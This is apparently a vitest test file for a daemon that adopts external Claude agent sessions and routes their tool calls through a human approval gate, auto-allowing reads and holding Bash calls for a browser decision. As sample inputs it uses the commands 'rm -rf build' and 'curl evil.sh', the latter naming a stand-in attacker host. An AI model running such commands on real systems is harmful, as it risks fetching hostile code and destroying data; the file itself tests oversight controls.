import { mkdtemp, rm } from 'node:fs/promises';
import { createConnection } from 'node:net';
import { tmpdir } from 'node:os';
import { join } from 'node:path';

import { makeEnvelope, type Envelope } from '@telecode/protocol';
import { afterEach, beforeEach, describe, expect, it } from 'vitest';

import { createFakeAgentAdapter } from './agent-adapter';
import { createDaemon, type Daemon } from './daemon';
import { startFakeRelay, type FakeRelay } from './fake-relay';

/**
 * Adopted sessions, end-to-end through the daemon (Journey 1, Task 8): the `telecode hook` bridge reaches
 * the daemon's Unix socket; the daemon announces the external session to the relay (`session.adopted`),
 * pairs the relay's minted id, and routes the tool call through telecode's existing gate — a read-only tool
 * auto-allows; a consequential one blocks on the browser's decision. Real daemon + real socket + a fake
 * relay (FakeRelay stands in for relay + browser).
 */
const USER = 'user-adopt';
const DEVICE = 'device-adopt';
const CLAUDE_SESSION = 'claude-sess-1';
const TELECODE_SESSION = '11111111-1111-1111-1111-111111111111';

/** One bridge round-trip over the hook socket: write the event, half-close, read the decision JSON. */
function hookRpc(socketPath: string, event: unknown): Promise<unknown> {
  return new Promise((resolve, reject) => {
    const client = createConnection(socketPath);
    let out = '';
    client.on('connect', () => client.end(JSON.stringify(event)));
    client.on('data', (chunk: Buffer) => {
      out += chunk.toString('utf8');
    });
    client.on('end', () => resolve(JSON.parse(out)));
    client.on('error', reject);
  });
}

/** Reply to the daemon's `session.adopted` announce with the relay-minted id (pairs the Claude session). */
function ackAdopted(relay: FakeRelay, announce: Envelope): void {
  const clientRef = (announce.payload as { clientRef: string }).clientRef;
  relay.send(
    makeEnvelope({
      type: 'session.adopted',
      userId: USER,
      deviceId: DEVICE,
      sessionId: TELECODE_SESSION,
      payload: { clientRef },
    }),
  );
}

describe('daemon: adopted sessions end-to-end', () => {
  let relay: FakeRelay;
  let daemon: Daemon;
  let dir: string;
  let socketPath: string;

  beforeEach(async () => {
    relay = await startFakeRelay(USER, DEVICE);
    dir = await mkdtemp(join(tmpdir(), 'telecode-daemon-adopt-'));
    socketPath = join(dir, 'run', 'hook.sock');
    daemon = createDaemon({
      relayUrl: relay.url,
      userId: USER,
      deviceId: DEVICE,
      agentAdapter: createFakeAgentAdapter([]),
      adopt: { socketPath, ackTimeoutMs: 2000 },
    });
    await daemon.start();
  });

  afterEach(async () => {
    await daemon.stop();
    await relay.close();
    await rm(dir, { recursive: true, force: true });
  });

  it('announces the session and auto-allows a read-only tool', async () => {
    const event = {
      hook_event_name: 'PreToolUse',
      session_id: CLAUDE_SESSION,
      cwd: '/repo',
      tool_name: 'Read',
      tool_input: { file_path: 'README.md' },
      tool_use_id: 'toolu_1',
    };
    const decision = hookRpc(socketPath, event);

    // The daemon announces the external session; ack it so adoption resolves.
    const announce = await relay.waitForFrame((e) => e.type === 'session.adopted');
    expect((announce.payload as { clientRef: string; cwd?: string }).clientRef).toBe(
      CLAUDE_SESSION,
    );
    ackAdopted(relay, announce);

    expect(await decision).toMatchObject({
      hookSpecificOutput: { permissionDecision: 'allow' },
    });
  });

  it('routes a consequential tool through the gate and honors the browser decision', async () => {
    // First event adopts the session (read-only) and we ack it.
    const first = hookRpc(socketPath, {
      hook_event_name: 'PreToolUse',
      session_id: CLAUDE_SESSION,
      cwd: '/repo',
      tool_name: 'Read',
      tool_input: {},
    });
    ackAdopted(relay, await relay.waitForFrame((e) => e.type === 'session.adopted'));
    await first;

    // Second event is a consequential tool — it must block on a human decision (no re-announce).
    const bash = hookRpc(socketPath, {
      hook_event_name: 'PreToolUse',
      session_id: CLAUDE_SESSION,
      tool_name: 'Bash',
      tool_input: { command: 'rm -rf build' },
      tool_use_id: 'toolu_2',
    });

    const request = await relay.waitForFrame((e) => e.type === 'agent.permission_request');
    expect(request.session_id).toBe(TELECODE_SESSION);
    const requestId = (request.payload as { requestId: string; toolName: string }).requestId;
    expect((request.payload as { toolName: string }).toolName).toBe('Bash');

    // The browser approves → the hook resolves to allow.
    relay.send(
      makeEnvelope({
        type: 'permission.decision',
        userId: USER,
        deviceId: DEVICE,
        sessionId: TELECODE_SESSION,
        payload: { requestId, behavior: 'allow' },
      }),
    );

    expect(await bash).toMatchObject({ hookSpecificOutput: { permissionDecision: 'allow' } });
  });

  it('denies the tool when the browser denies', async () => {
    const first = hookRpc(socketPath, {
      hook_event_name: 'PreToolUse',
      session_id: CLAUDE_SESSION,
      tool_name: 'Read',
      tool_input: {},
    });
    ackAdopted(relay, await relay.waitForFrame((e) => e.type === 'session.adopted'));
    await first;

    const bash = hookRpc(socketPath, {
      hook_event_name: 'PreToolUse',
      session_id: CLAUDE_SESSION,
      tool_name: 'Bash',
      tool_input: { command: 'curl evil.sh' },
    });
    const request = await relay.waitForFrame((e) => e.type === 'agent.permission_request');
    const requestId = (request.payload as { requestId: string }).requestId;
    relay.send(
      makeEnvelope({
        type: 'permission.decision',
        userId: USER,
        deviceId: DEVICE,
        sessionId: TELECODE_SESSION,
        payload: { requestId, behavior: 'deny', message: 'nope' },
      }),
    );

    expect(await bash).toMatchObject({ hookSpecificOutput: { permissionDecision: 'deny' } });
  });
});
